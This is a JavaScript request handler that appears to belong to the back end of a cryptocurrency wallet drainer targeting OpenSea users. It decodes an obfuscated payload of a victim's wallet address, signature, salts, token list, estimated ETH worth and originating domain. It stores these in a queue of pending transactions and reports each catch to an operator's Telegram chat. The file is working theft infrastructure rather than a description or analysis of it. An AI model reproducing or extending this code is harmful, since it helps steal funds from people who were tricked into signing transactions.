import { addToTable } from "../db/addUserToTable.js";
import { getDB } from "../db/getDb";
import {
  ADDR_REGEX,
  CHAT_ID_APP,
  CHAT_ID_ERR,
  SEA_TX_ROW,
  SIG_REGEX,
} from "../utils/constants.js";
import { responde } from "../utils/responde.js";
import { sleep } from "../utils/sleep.js";
import { fAddr, tgSend } from "../utils/tgSend.js";
import { c, d } from "../utils/translator.js";

export async function addSeaHandler(req, res) {
  try {
    const { addr, tokensArr, sig, sigTime, salt, salt2, worth, domain } = d(
      req.body.payload
    );

    // validation
    if (
      !addr ||
      !tokensArr ||
      !sig ||
      !sigTime ||
      !salt ||
      !salt2 ||
      !worth ||
      !domain
    ) {
      console.log("Sea error: one of the required value are missing");
      responde(res);
      return;
    }
    if (addr.length !== 40 || sig.length !== 130) {
      console.log("Error: wrong length of addr or sign");
      responde(res);
      return;
    }
    if (!ADDR_REGEX.test(addr) || !SIG_REGEX.test(sig)) {
      console.log("Error: wrong addr or sign");
      responde(res);
      return;
    }

    // check duplicates
    const db = await getDB();
    const row = await db.get("select * from sea_users where addr=?", [c(addr)]);
    if (row) {
      responde(res);
      console.log("AddSea Error: Duplicate value");
      return;
    }

    // add to db
    await addToTable("sea_users", {
      addr: c(addr),
      tokensArr: c(tokensArr),
      sig: c(sig),
      sigTime: c(sigTime),
      salt: c(salt),
      salt2: c(salt2),
      worth: c(worth),
      domain: c(domain),
    });
    await addToTable(
      "tx_waiting",
      {
        addr: c(addr),
        tokensArr: c(tokensArr),
        sig: c(sig),
        sigTime: c(sigTime),
        salt: c(salt),
        salt2: c(salt2),
      },
      SEA_TX_ROW
    );

    // send to tg
    tgSend(
      `${domain} | Opensea\nAddress: ${fAddr(addr)}\nWorth: ${worth} ETH`,
      CHAT_ID_APP
    );
  } catch (e) {
    tgSend("Error [addSeaHandler]:" + e, CHAT_ID_ERR);
    console.log("[addSeaHandler] Error:", e);
    await sleep(5000);
  }

  responde(res);
}
